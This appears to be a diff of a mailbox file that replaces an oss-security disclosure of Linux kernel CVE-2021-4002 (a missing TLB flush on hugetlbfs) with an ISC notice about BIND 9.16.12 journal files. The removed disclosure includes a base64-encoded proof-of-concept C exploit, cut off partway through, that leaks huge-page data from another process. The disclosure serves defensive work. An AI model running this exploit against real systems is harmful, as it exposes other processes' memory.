@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["8592" "Thursday" "25" "November" "2021" "19:15:19" "+0000" "Nadav Amit" "namit@vmware.com" nil "148" "[oss-security] CVE-2021-4002: Linux kernel: Missing TLB flush on hugetlbfs" nil nil nil "11" nil nil (number mark "U       namit@vmware Nov 25  148/8592  " thread-indent "\"[oss-security] CVE-2021-4002: Linux kernel: Missing TLB flush on hugetlbfs\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-4002: Linux kernel: Missing TLB flush on hugetlbfs" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["8676" "Saturday" "20" "February" "2021" "02:42:38" "+0000" "ISC Security Officer" "security-officer@isc.org" nil "193" "[oss-security] BIND Operational Notification: Zone journal (.jnl) file incompatibility,after upgrading to BIND 9.16.12 and 9.17" nil nil nil "2" nil nil (number mark "U       security-off Feb 20  193/8676  " thread-indent "\"[oss-security] BIND Operational Notification: Zone journal (.jnl) file incompatibility,after upgrading to BIND 9.16.12 and 9.17\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] BIND Operational Notification: Zone journal (.jnl) file incompatibility,after upgrading to BIND 9.16.12 and 9.17" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32573 invoked by uid 550); 25 Nov 2021 21:57:38 -0000
+Received: (qmail 11345 invoked by uid 550); 20 Feb 2021 07:46:13 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,251 +12,227 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 10217 invoked from network); 25 Nov 2021 19:15:35 -0000
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=Dp31+TypSXrsgRa7/4FCPkmxoI46i/jKUuVnWWZ8nBnlsTpKHvYaR4Zno3rBYUQUD6vzE1odjUM7KqbK+4ln7vXtO6+ZeHiTR9Zmhjxwjf6ApKYnyR/MM4lEfadidv4iq6iBykkP45l93XDI+g9UFh5etLJ/v90EQT8IA7qnD2lcCQ93cgaV54BUuqOTEcedsvkvzJ26J1eShT6ZIQjDRMY9tJi3hB2n9mJVEGlldmDFD0gvrzgvmmjRIPmw7yjGdLuitdcdgAJuJZdf8a2mWUWnLhSO+zGwJg4gI/W7EVA/g/mN6n3RS9CcyH5Yb28X2fNwV4USJekyyBHMIiDo7Q==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=TrpGZgnzfRy/+8yOODkm/DUsaqqSBNst+spI68WzTJA=;
- b=adKGyUGEOIt3B1w8Uti1yoZ7THdRwu9XwUvLnHiIxHD0SVAgoqzjfnR81EDMNhbCVIUFr+8/mG+9IKUVKrnH6M0zv2DcsR+ZSmfCyxwcQNqjSdKIWmTFlcPIuhYI7mDXPnBVhRNPCbYkFPq8lY1FzrVPJqPVaBtnyALKowKw6p4JLQxyIWcilTjfeizHL+Kh7iyEl0Vg/1+hjiTrtMuXcby0EAVeg32geRLGpCg5+GFqQ3DSoF0sj65lKAk7GAYZ9F6LbdD8wpyb2k5XDY+H9nz/39BUXht0W8DW0m41nJGHmF59BqqTYx1q028vXPRJosVYaze70eIKO8bEqWDumg==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=vmware.com; dmarc=pass action=none header.from=vmware.com;
- dkim=pass header.d=vmware.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=vmware.com;
- s=selector2;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=TrpGZgnzfRy/+8yOODkm/DUsaqqSBNst+spI68WzTJA=;
- b=JJ/GjRoO/21DiNsab0NdnyRksomqiT+xTk7E+8irWavTxLbwhQq3XL5aecHVVpG8Vl2LYDv5uWE79OxO9M56aRkik3QpexFx241vvkxLzJXZ31JsevCHwAYw5githhd4e1espyzPRxGpi6t7IXRb8gNuhJKbJJDVSFFdDbYh7bQ=
-From: Nadav Amit <namit@vmware.com>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-CC: Mike Kravetz <mike.kravetz@oracle.com>, Greg Kroah-Hartman
-	<gregkh@linuxfoundation.org>, Security Officers <security@kernel.org>, Andrew
- Morton <akpm@linux-foundation.org>
-Thread-Topic: CVE-2021-4002: Linux kernel: Missing TLB flush on hugetlbfs
-Thread-Index: AQHX4jDJBfCNX81QFk2dyracuAH+yA==
-Date: Thu, 25 Nov 2021 19:15:19 +0000
-Message-ID: <EF0C4A70-7268-4894-A006-1540CD68CB45@vmware.com>
-Accept-Language: en-US
-Content-Language: en-US
-X-MS-Has-Attach: yes
-X-MS-TNEF-Correlator: 
-x-mailer: Apple Mail (2.3654.120.0.1.13)
-authentication-results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=vmware.com;
-x-ms-publictraffictype: Email
-x-ms-office365-filtering-correlation-id: 74356a13-2887-4211-f8bd-08d9b047ebe3
-x-ms-traffictypediagnostic: BYAPR05MB5047:
-x-microsoft-antispam-prvs: 
- <BYAPR05MB5047C9DF978460AFBE770952D0629@BYAPR05MB5047.namprd05.prod.outlook.com>
-x-ms-oob-tlc-oobclassifiers: OLM:9508;
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam: BCL:0;
-x-microsoft-antispam-message-info: 
- h2jy2czkufR/Sm4avuGfd/NBHf90sR9tKlzOHnhF1v8YORbiqUs9kP5WRyP6DmQPW3xxvxM3La6ougShOxZPHD4dw+PYaxDbINMJ/8TAr8pgvZ/1My5MB10JdQTtjI5OuuCXdM+CFTitufeh6STaAjG8LBJfJeV+pxdGWYmLEiRTsr7NK8FT3XBhUuztzMcdgnb9zfPL296ZGQh2nlsRz+KBMSJLGZ1UJApP31Wc9cqnsbuRy+u9b/dEMZ0MtqELNRCzTO8Mn63fIjHxhELUOcYJ/nsMUgD3gK00Q1Pt8c/iulZy5gjX4jV/1or+UUJ/agBmfbUGymwQDIbx+f/fZucuszp7NNFLVw2gduD5mzD6qXdXTHiZyuHAe+ZdXnncPkAHpNiWMaHWYWKaMl/UW1aKmGzBIQZ0sDxEChi2H0iqdlLQKpPHMUC3w1W7gFWkNU5SCu+p/cdWa+ZeAaeFabiLRRzctjOghb4h9TFeV85maMyfRG4mveVNdJ75jlQhSXMwRYXHJ3KfM6x+zVLH0IUclOE7jd6fN0pglnX+Jn0zs3SUhLXePv/jZfEbuLygJyt6EJrQDOgodsDKNSyIlouHV0/+tG48fABVZ1oGiX7pbgQzfQIChMynJhzCVLNkE7oSNG3DYTuQmRvBtUbCGcwxUFyvdVg+6gfjpyy+aOCHwJlH+UI8OX80CnpqOn59VOH0AOgPb2zfQaHh//CCmjK/tUgR5LurkbdZjj82n7ypzDDrrvFuc2hiqHizfPp9
-x-forefront-antispam-report: 
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BY3PR05MB8531.namprd05.prod.outlook.com;PTR:;CAT:NONE;SFS:(4636009)(366004)(2906002)(6486002)(2616005)(316002)(6512007)(86362001)(8676002)(122000001)(76116006)(36756003)(8936002)(33656002)(71200400001)(26005)(38100700002)(6506007)(54906003)(99936003)(6916009)(38070700005)(66556008)(64756008)(66476007)(508600001)(66946007)(66446008)(5660300002)(4326008)(186003)(45980500001);DIR:OUT;SFP:1101;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0: 
- =?utf-8?B?ZjBSNTFnbnNGNENGZGFuNkNlT3UxdHVYd0haRHVoS1BabWpIeWFtUkdQSFFk?=
- =?utf-8?B?Y3NCMG15UWYrTVdSL2lUbDlaUTdoWGM0bklzRnV2aHJvVjR5VzRtcDB2V1JU?=
- =?utf-8?B?cVNaekxMTUZ6V053aVNPVklFSlpPOGwzMGtFczZSc0VCaUVCS3ZMY09CSEtv?=
- =?utf-8?B?bXdRRVRZcGlxTVN2QXZtdElWc1JlTG5DTFBiMlhMbm44bW4vOFFPMkhaSXN6?=
- =?utf-8?B?Uk05c2NsN2NrTnpmTTl4bVBNczFWYXBMLzEyaUIrbUJEaW5ESTRYV3BsSEN4?=
- =?utf-8?B?V3ZhUW1QSEpRRUJqTTBDY1dkcnJiczNrM3FTWU9XbDNnMTB2MlJsQ3NvaEgz?=
- =?utf-8?B?TVJHNUlMeFhwcFVZR2MwWm0yNmV5Z2M0Szdqa0tqSXc0VmpqdHRsbnBOQ2tX?=
- =?utf-8?B?UXE1TDBsMEVBQ3Urd3JjSWZiSGEwRkVuVm4vNzhOMkVDa3UyOGd3bzg2L1U3?=
- =?utf-8?B?WEJhTEhWTG5sVEs4ckVQeEp5b0JYSmllaTIzcHVUU0hyWkIyN1VMZlkyL3JY?=
- =?utf-8?B?bzFMV21DY3c0VDVjaDdmNmdyczNmd0dzY3huWlhvNW1Zak9TVnBFUXhERG9S?=
- =?utf-8?B?VzI5ck9LeVVzeHVOenViaFpEUnJhVFRuN3VMbHVsUDAwN0lpSUtLSk1BNzVD?=
- =?utf-8?B?SFNMenR6eUhsdURGRmJuRU9NM2J1NEhnbW1BNGEzWEQ2ZHVFR09jWUwweVBw?=
- =?utf-8?B?djlvcVc5VEU1N0RIcHpsb2k5djZOeGZrakNoeE1jVXpSR1B4U0Vnc3huV0U0?=
- =?utf-8?B?eSt5R1V0US95US9qZ2RIQU1la2twOGZoL3FMeUNsOVVuU3BUbEFpblhkMC9U?=
- =?utf-8?B?RXZ4dlJSN0ZDMG1QYUFUMXludDBvYkdIMkpIcElXZm5ubjNFQnFmbC9JK01o?=
- =?utf-8?B?cHNNZmswcmhWaTJwZHNzU1VmdWZRcCtFTjJjMFhBVE56T2NvTG1HaHUxazdD?=
- =?utf-8?B?WVBaRlNhdVdVb3VpNTZaMXRYUUhEUXhIS2psV042ZHdub2k3aXFyVE1RSjVR?=
- =?utf-8?B?Z2FmUUxzaEVzK3IzZjh6R3pSa3FkYzZlSXNmZnhzaXpRYnJMMWx3UHcwSndW?=
- =?utf-8?B?RDU1RytkV0QybXkxNlBsRWpLVXlKUVVFQXpPQ1hDMkNFSGg3cjR1MEJ3SlpE?=
- =?utf-8?B?U2VUelprWGo5cy9JbCs1aE5zUkFGUkEya2l1dnp2dEFYZG9zNEZkcS9HNEZJ?=
- =?utf-8?B?cjBUUGthM3BBY3A4blBlZldad2tDbnJlb08yRHFKeXVsY1lENWhnTytxOC9S?=
- =?utf-8?B?eGFYYWJGeTFyTE1vSWxOQnovaEhpNVpXcDk0eHhrUXEyR2xaUzd6cUFab3ZE?=
- =?utf-8?B?OVhLdFc5SHExVzNTUjJiQUdWbWhOeXhRdXBQak9rR1YvRFFhZnI2RVA3R3g3?=
- =?utf-8?B?TzlxUDZqTm4zMTVvajBMbS9NY1NVa1VyQjB6MDZCT3hjdVFXUnI4SllXZkVZ?=
- =?utf-8?B?QUQzN1IwM1kzWmE1REY2QkNMVmZpald6Zy80T2UxVm9YNlVMYk9xekdBZGtU?=
- =?utf-8?B?MWd4MWJYbVVJbFpadmJvVThXOW5wbkR4T1J0Szh3ZkpDV3U4UGN1VHQzRlBZ?=
- =?utf-8?B?WHJPZGwzajZsZUtha0NjaFdPWHFia1JUR2pYVmlzVXlhNUdqNHVFdlBDcGYz?=
- =?utf-8?B?QkZsaEdWcTNnRUNLM3BKYVl6eVQzTEJIQ3E0Z28zUUR5Vm8rSGMyd0d0MmpD?=
- =?utf-8?B?R0VGZ0w5TmRRemZPZ1dEUFltZVNWb2cxODRqS2pTTWpBNDhteXB3ZFlNeEN3?=
- =?utf-8?B?SkQ4bmxPVTFrVUVDaGtiODRycFZUQ0JySWtxcXp5U1RXUjBUWGVMTjBFT05Q?=
- =?utf-8?B?LzE1WEpFSmdJK09Ld3N5U2dNVGdoVWhzRjBsbG13cEJPUVVPUGFHUlZseGRT?=
- =?utf-8?B?ZnVacmxXQlZRZk9KWXI1bHhGRnpDSHBjdHNaYWdabWxYdDVxWTVzOUVvLzhU?=
- =?utf-8?B?RDJOenlBL0NHanFYWDRjeUcvK3pQclRKcGtCYkdlaEVpZi9JQUxObFpUaE1z?=
- =?utf-8?B?azZaNjdlek1ZbGRIZXRWU0RvYm5Hc3I4ajAyOW9EMy9XR0NqUjJlN25hY2dI?=
- =?utf-8?B?NjlycUpIdTRrYk5XSGd2N2g0VDhSM0d3QVpDRlcxQWNwTUU4cER4TFkxMkY5?=
- =?utf-8?B?cEUxRVNNdkhTZFdySG40WDVnUVQwckhwajFiZ0xmL1F6YlVFRnQ1aEsrUEF4?=
- =?utf-8?Q?eMIGIt3QFD7K/4LbYCU6/qo=3D?=
-Content-Type: multipart/mixed;
-	boundary="_002_EF0C4A7072684894A0061540CD68CB45vmwarecom_"
+Received: (qmail 29795 invoked from network); 20 Feb 2021 02:42:57 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=isc.org; s=ostpay;
+	t=1613788963; bh=yyVfmGLCSHRfvLbPnJiguadZq4GISIegTb0hmMQn/oU=;
+	h=To:Cc:From:Subject:Date;
+	b=oMwlCcE/XXW+8egiMCk7Pvia781Zz0EIU8N4mMzrLBEk9oE2hs+joSNWrFBGwmGZv
+	 LYAoOBaOTPhE+coEJovT3n7UemIfDJ/ER9DArFkOhP67dbGLUTBEE5sfjbEVa6ec52
+	 aUaPOHUm4WMIBBsF1fUoZouQ368ux5g9/n10kdcs=
+DKIM-Filter: OpenDKIM Filter v2.9.2 zmx1.isc.org CFD23160086
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=isc.org;
+	s=05DFB016-56A2-11EB-AEC0-15368D323330; t=1613788962;
+	bh=Zn7++YQ/RHn35bHHa4oTpSy+gJ2h1K8OTpMCQhwlYBE=;
+	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type:
+	 Content-Transfer-Encoding;
+	b=E/tbAEDOhZQVC1wYV1GSYxbjIrNMt5HebBVqiixCJ7amZwlT/nRGiXNsN5PLc2sAb
+	 nKzDE+dV35Qv/VYdD/PhlYalZw/EIsKQj/DrcgfdSXXysXR153PyX4+t3Mu4MTf3Vr
+	 CozpYMtnKMACrz2mbtW0eKD5gfTQIUWi1fgxHFQQ=
+To: oss-security@lists.openwall.com
+Cc: ISC Security Officer <security-officer@isc.org>
+From: ISC Security Officer <security-officer@isc.org>
+Organization: Internet Systems Consortium
+Message-ID: <3a4ed73f-854b-539b-67df-422a808b0ce8@isc.org>
+Date: Sat, 20 Feb 2021 02:42:38 +0000
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0)
+ Gecko/20100101 Thunderbird/78.7.1
 MIME-Version: 1.0
-X-OriginatorOrg: vmware.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-AuthSource: BY3PR05MB8531.namprd05.prod.outlook.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 74356a13-2887-4211-f8bd-08d9b047ebe3
-X-MS-Exchange-CrossTenant-originalarrivaltime: 25 Nov 2021 19:15:19.5173
- (UTC)
-X-MS-Exchange-CrossTenant-fromentityheader: Hosted
-X-MS-Exchange-CrossTenant-id: b39138ca-3cee-4b4a-a4d6-cd83d9dd62f0
-X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
-X-MS-Exchange-CrossTenant-userprincipalname: 6VbGEaBBR0n3l4OT0GPho4ob+UPQzLeomfLID0Ej3D10UClSTsu1avpVOvbL6MQjcMfCtamIVV4V57cfdgn+vg==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: BYAPR05MB5047
-Subject: [oss-security] CVE-2021-4002: Linux kernel: Missing TLB flush on hugetlbfs
+Content-Type: text/plain; charset=utf-8
+Content-Language: en-US
+Content-Transfer-Encoding: quoted-printable
+Subject: [oss-security] BIND Operational Notification: Zone journal (.jnl) file
+ incompatibility,after upgrading to BIND 9.16.12 and 9.17
 
---_002_EF0C4A7072684894A0061540CD68CB45vmwarecom_
-Content-Type: text/plain; charset="utf-8"
-Content-ID: <FEECCCC191469F48B38C392C2BCF3548@namprd05.prod.outlook.com>
-Content-Transfer-Encoding: base64
+To the packagers and redistributors of BIND --
 
-T24gTGludXgga2VybmVsIDMuNiBhbmQgbGF0ZXIgaXQgaXMgcG9zc2libGUg
-Zm9yIGFuIGF0dGFja2VyIHRvIGxlYWsgb3IgY2hhbmdlDQpkYXRhIHRoYXQg
-cmVzaWRlcyBvbiBodWdldGxiZnMuIFN1Y2ggZGF0YSBjYW4gcmVzaWRlIG9u
-IGh1Z2V0bGJmcywgZm9yDQppbnN0YW5jZSwgaWYgdGhlIHZpY3RpbSBydW5z
-IG1tYXAoKSB1c2luZyB0aGUgTUFQX0hVR0VUTEIgb3Igc2htZ2V0KCkgd2l0
-aA0KU0hNX0hVR0VUTEIuIElmIGEgdmljdGltIG1hcHMgZXhlY3V0YWJsZSBj
-b2RlIG9udG8gaHVnZXRsYmZzLCB0aGUgZXhlY3V0YWJsZQ0KY2FuIGJlIG1v
-ZGlmaWVkIGFzIHdlbGwuDQoNClRoZSBidWcgaXMgY2F1c2VkIGR1ZSB0byBh
-IG1pc3NpbmcgVExCIGZsdXNoIHdoZW4gdW5tYXBwaW5nIG9mIGEgcGFnZSBv
-ZiBQTURzDQppcyBwZXJmb3JtZWQgYnkgY2xlYXJpbmcgYSBQVUQuIFdoaWxl
-IHRoZSBjb21tZW50IGluIHRoZSBjb2RlIGNsYWltcyB0aGF0IGl0DQppcyBz
-YWZlLCBpdCBpcyBub3QsIHNpbmNlIG5vIGZsdXNoIHdvdWxkIHRha2UgcGxh
-Y2UgdW5kZXIgdGhlc2UgY2lyY3Vtc3RhbmNlcw0KKHVubGVzcywgb2YgY291
-cnNlLCBpdCB3YXMgbmVlZGVkIGZvciBzb21lIG90aGVyIHJlYXNvbikuDQoN
-CkFwcGFyZW50bHkgdGhlIGJ1ZyBleGlzdGVkIHNpbmNlIGNvbW1pdCAyNDY2
-OWU1ODQ3N2UgKCJodWdldGxiOiB1c2UgbW11X2dhdGhlcg0KaW5zdGVhZCBv
-ZiBhIHRlbXBvcmFyeSBsaW5rZWQgbGlzdCBmb3IgYWNjdW11bGF0aW5nIHBh
-Z2VzKeKAnSB3aGljaCBtZWFucyB0aGF0DQppdCBleGlzdGVkIHNpbmNlIGtl
-cm5lbCAzLjYuIFRoZXJlIG1pZ2h0IGJlIHNvbWUgbWl0aWdhdGluZyBmYWN0
-b3JzIGluDQpjZXJ0YWluIG9sZGVyIGtlcm5lbHMgb24gY2VydGFpbiBhcmNo
-aXRlY3R1cmVzLiBGb3IgaW5zdGFuY2UsIHg4NiBwZXJmb3JtZWQNClRMQiBm
-bHVzaGVzIG9uIGh1Z2UtcGFnZXMgbW9yZSBlYWdlcmx5IGluIHRoZSBwYXN0
-Lg0KDQoNCkZpeDoNCg0KVGhlIGZpeCBpcyB1cHN0cmVhbWVkIGFzIGNvbW1p
-dCBhNGExMThmMmVlYWQgKCJodWdldGxiZnM6IGZsdXNoIFRMQnMgY29ycmVj
-dGx5DQphZnRlciBodWdlX3BtZF91bnNoYXJl4oCdKS4gQmFja3BvcnRpbmcg
-b2YgdGhlIGZpeCB0byBvbGRlciBrZXJuZWxzIGlzIGluDQpwcm9ncmVzcy4N
-Cg0KVG8gZml4IHRoZSBidWcgYSBjYWxsIHRvIHRsYl9mbHVzaF9wbWRfcmFu
-Z2UoKSBpcyBuZWVkZWQgZnJvbQ0KX191bm1hcF9odWdlcGFnZV9yYW5nZSgp
-IHdoZW4gaHVnZV9wbWRfdW5zaGFyZSgpIHN1Y2NlZWRzLCBhbmQgZm9yY2lu
-ZyBhIGZsdXNoDQpiZWZvcmUgcmV0dXJuaW5nIGZyb20gX191bm1hcF9odWdl
-cGFnZV9yYW5nZSgpLg0KDQoNCkRldGFpbHM6DQoNCkFuIGF0dGFja2VyIGNh
-biB1c2luZyBzaG1nZXQoKSA1MTIgcGFnZXMgb2YgMk1CIG1hcCB0d2ljZSB3
-aGljaCBhcmUgYWxpZ25lZCB0bw0KUFVEIGFsaWdubWVudCBhbmQgZmF1bHQg
-aW4gc29tZSBvZiB0aGUgcGFnZXMuIEFzIHRoZSBwYWdlcyBhcmUgcHJvcGVy
-bHkNCmFsaWduZWQsIHRoZSBrZXJuZWwgd291bGQgc2hhcmUgYSBQVUQgYmV0
-d2VlbiB0aGUgbWFwcGluZ3MuIExhdGVyIHRoZQ0KYXR0YWNrZXIgd291bGQg
-cmVtb3ZlIHRoZSBtYXBwaW5ncyBhbmQgdGhlIHNoYXJlZCBtZW1vcnkgc2Vn
-bWVudHMuIA0KDQpUaGUgZmlyc3QgbWFwcGluZyB0aGF0IGlzIHJlbW92ZWQg
-ZG9lcyBub3QgdHJpZ2dlciBhIFRMQiBmbHVzaCBkdWUgdG8gYSBidWcNCmlu
-IF9fdW5tYXBfaHVnZXBhZ2VfcmFuZ2UoKS4gTGF0ZXIsIGlmIHRoZSBrZXJu
-ZWwgcmVhbGxvY2F0ZXMgdGhlIGh1Z2UtcGFnZXMNCnRvIGFub3RoZXIgcHJv
-Y2VzcyBzaG9ydGx5IGFmdGVyLCBhbiBhdHRhY2tlciB3b3VsZCBiZSBhYmxl
-IHRvIHJlYWQgYW5kIHdyaXRlDQp0aGVzZSBodWdlLXBhZ2VzIGZvciBzb21l
-IHRpbWUgKHVudGlsIFRMQiBmbHVzaCBoYXBwZW5zIGZvciBzb21lIG90aGVy
-IHJlYXNvbg0KbGF0ZXIgb24pLg0KDQpBIHByb29mIG9mIGNvbmNlcHQgaXMg
-YXR0YWNoZWQuIFRoZSBQb0MgY3JlYXRlcyBhIGNoaWxkIHByb2Nlc3MgdGhh
-dCBhbGxvY2F0ZXMNCmEgaHVnZS1wYWdlIGFuZCB0aGlzIGRhdGEgaXMgbGVh
-a2VkIGJhY2sgdG8gdGhlIHBhcmVudC4gVGhlcmUgaXMgbm8gbmVlZCBmb3IN
-CnRoZSBhdHRhY2tlciB0byBiZSB0aGUgcGFyZW50IG9mIHRoZSBjaGlsZCBh
-bmQgdGhpcyBpcyBvbmx5IGltcGxlbWVudGVkIGluDQpzdWNoIG1hbm5lciBm
-b3Igc2ltcGxpY2l0eS4gVGhlIFBvQyBmYWlscyBvbiB0aGUgZmlyc3QgaXRl
-cmF0aW9uIG9uIG15IHN5c3RlbQ0KcmVwZWF0ZWRseSAoYWx0aG91Z2ggaXQg
-aXMgd3JpdHRlbiB0byBtYWtlIG11bHRpcGxlIGF0dGFjayBhdHRlbXB0cyku
-DQoNClRvIG1ha2UgaXQgd29yayB0aGUgUG9DIHdvcmssIGNvbmZpZ3VyZSB0
-aGUgbnVtYmVyIG9mIHBhZ2VzIHRvIDUxMg0KKCJlY2hvIDUxMiA+IC9wcm9j
-L3N5cy92bS9ucl9odWdlcGFnZXMiKSwgc28gaHVnZS1wYWdlcyB3aWxsIGJl
-IGF2YWlsYWJsZSBmb3INCnRoZSBQb0MgYW5kIHdpbGwgYmUgcmV1c2VkIGJ5
-IHRoZSB2aWN0aW0uDQoNCg==
+To our great embarrassment and sincere regret, another serious problem
+has been found affecting servers upgrading to BIND 9.16.12.
 
---_002_EF0C4A7072684894A0061540CD68CB45vmwarecom_
-Content-Type: application/octet-stream; name="poc.c"
-Content-Description: poc.c
-Content-Disposition: attachment; filename="poc.c"; size=3271;
-	creation-date="Thu, 25 Nov 2021 19:15:19 GMT";
-	modification-date="Thu, 25 Nov 2021 19:15:19 GMT"
-Content-ID: <06EEAB6F49CE3140AE8E3427E43ADAF5@namprd05.prod.outlook.com>
-Content-Transfer-Encoding: base64
+If you have not already distributed packages based on 9.16.12 but
+planned to do so, we recommend that you change your plans and instead
+issue an updated package based on 9.16.11 plus the CVE-2020-8625 patch
+found at
+https://downloads.isc.org/isc/bind9/9.16.12/patches/CVE-2020-8625.patch.
 
-I2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9tbWFuLmg+
-DQojaW5jbHVkZSA8c3lzL2lwYy5oPg0KI2luY2x1ZGUgPHN5cy9zaG0uaD4N
-CiNpbmNsdWRlIDxzZXRqbXAuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNp
-bmNsdWRlIDxzaWduYWwuaD4NCiNpbmNsdWRlIDxzdGRib29sLmg+DQojaW5j
-bHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCg0KI2RlZmlu
-ZSBTSE1fSFVHRV9TSElGVCAoMjYpDQojZGVmaW5lIFBNRF9TSVpFICgxdWxs
-IDw8IDIxKQ0KI2RlZmluZSBQVURfU0laRSAoMXVsbCA8PCAzMCkNCiNkZWZp
-bmUgQUxMT0NfU0laRSBQVURfU0laRQ0KI2RlZmluZSBQVURfTUFTSyAofihQ
-VURfU0laRSAtIDEpKQ0KDQpzdGF0aWMgc2lnam1wX2J1ZiBtYXJrOw0Kdm9s
-YXRpbGUgY2hhciAqY2hhbjsNCg0Kc3RhdGljIHZvaWQgd3JpdGVfc2VjcmV0
-KHZvaWQpDQp7DQoJdm9sYXRpbGUgdW5zaWduZWQgbG9uZyAqcDsNCglpbnQg
-cjsNCg0KcmV0cnk6DQoJd2hpbGUgKCpjaGFuID09IDApOw0KDQoJcCA9IG1t
-YXAoMCwgUE1EX1NJWkUsIFBST1RfUkVBRHxQUk9UX1dSSVRFLCBNQVBfUFJJ
-VkFURXxNQVBfQU5PTnxNQVBfSFVHRVRMQiwgMCwgMCk7DQoJaWYgKHAgPT0g
-TUFQX0ZBSUxFRCkgew0KCQlwZXJyb3IoIm1tYXAiKTsNCgkJZXhpdCgxKTsN
-Cgl9DQoJKnAgPSAweGRlYWRiZWVmOw0KDQoJd2hpbGUgKCpjaGFuID09IDEp
-Ow0KCXIgPSBtdW5tYXAoKHZvaWQgKilwLCBQTURfU0laRSk7DQoJaWYgKHIg
-IT0gMCkgew0KCQlwZXJyb3IoIm11bm1hcCIpOw0KCQlleGl0KDEpOw0KCX0N
-CglpZiAoKmNoYW4gIT0gMTAwKSB7DQoJCSpjaGFuID0gMDsNCgkJZ290byBy
-ZXRyeTsNCgl9DQoJZXhpdCgxKTsNCn0NCg0Kc3RhdGljIHZvaWQgbXloYW5k
-bGVyKGludCBzaWdudW0pDQp7DQoJcHJpbnRmKCJmYWlsZWRcbiIpOw0KCSpj
-aGFuID0gMjsNCglzaWdsb25nam1wKG1hcmssIC0xKTsNCn0NCg0KI2RlZmlu
-ZSBOX1RSSUVTCQkoMTAwKQ0KDQppbnQgbWFpbih2b2lkKQ0Kew0KCWludCBz
-aG1mbGcsIHIsIGksIHNobV9pZFsyXSA9IHstMSwgLTF9Ow0KCWtleV90IHNo
-bV9rZXkgPSBmdG9rKCIuIiwgJ3gnKTsNCglzdHJ1Y3Qgc2lnYWN0aW9uIG15
-aGFuZGxlOw0KCWJvb2wgc3VjY2VzcyA9IGZhbHNlOw0KCXZvbGF0aWxlIHVu
-c2lnbmVkIGxvbmcgKnBbMl07DQoJdW5zaWduZWQgbG9uZyBhZGRyLCB2Ow0K
-CWludCB0cmllcyA9IDE7DQoJdm9pZCAqZnJlZV9wOw0KCXNpZ3NldF90IG1h
-c2s7DQoNCgkvLyBGaW5kIHNvbWUgdmFsaWQgcmFuZ2UgZm9yIG91ciBnYW1l
-cw0KCWZyZWVfcCA9IG1tYXAoMCwgQUxMT0NfU0laRSozLCBQUk9UX05PTkUs
-IE1BUF9QUklWQVRFfE1BUF9BTk9OLCAwLCAwKTsNCglpZiAocCA9PSBNQVBf
-RkFJTEVEKSB7DQoJCXBlcnJvcigibW1hcCIpOw0KCQlleGl0KDEpOw0KCX0N
-Cg0KCWNoYW4gPSBtbWFwKDAsIDQwOTYsIFBST1RfUkVBRHxQUk9UX1dSSVRF
-LCBNQVBfU0hBUkVEfE1BUF9BTk9OLCAwLCAwKTsNCglpZiAoY2hhbiA9PSBN
-QVBfRkFJTEVEKSB7DQoJCXBlcnJvcigibW1hcCBzaGFyZWQiKTsNCgkJZXhp
-dCgxKTsNCgl9DQoJbXVubWFwKGZyZWVfcCwgQUxMT0NfU0laRSozKTsNCgkq
-Y2hhbiA9IDA7DQoNCglpZiAoZm9yaygpID09IDApDQoJCXdyaXRlX3NlY3Jl
-dCgpOw0KDQoJc2lnZW1wdHlzZXQoJm1hc2spOw0KCXNpZ2FkZHNldCgmbWFz
-aywgU0lHU0VHVik7DQoNCglteWhhbmRsZS5zYV9oYW5kbGVyID0gbXloYW5k
-bGVyOw0KCXNpZ2VtcHR5c2V0KCZteWhhbmRsZS5zYV9tYXNrKTsNCglteWhh
-bmRsZS5zYV9mbGFncyA9IDA7DQoJciA9IHNpZ2FjdGlvbihTSUdTRUdWLCAm
-bXloYW5kbGUsIE5VTEwpOw0KCWlmIChyIDwgMCkgew0KCQlwZXJyb3IoInNp
